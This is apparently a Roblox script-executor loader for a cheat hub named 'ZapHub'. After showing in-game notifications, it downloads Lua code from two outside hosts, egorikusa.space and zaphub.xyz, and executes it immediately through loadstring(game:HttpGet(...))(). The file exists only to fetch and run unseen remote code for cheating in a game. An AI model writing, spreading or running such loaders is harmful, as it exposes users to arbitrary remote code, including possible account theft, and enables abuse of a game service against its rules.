local function sendNotification(title, text)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = title,
		Text = text
	})
end

sendNotification("ZapHub", "Loading Utils...")
loadstring(game:HttpGet('https://egorikusa.space/78eede770504999a0cbdf477.lua'))()

sendNotification("ZapHub", "Loading ZapHub...")
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()

sendNotification("ZapHub", "Finished loading.")
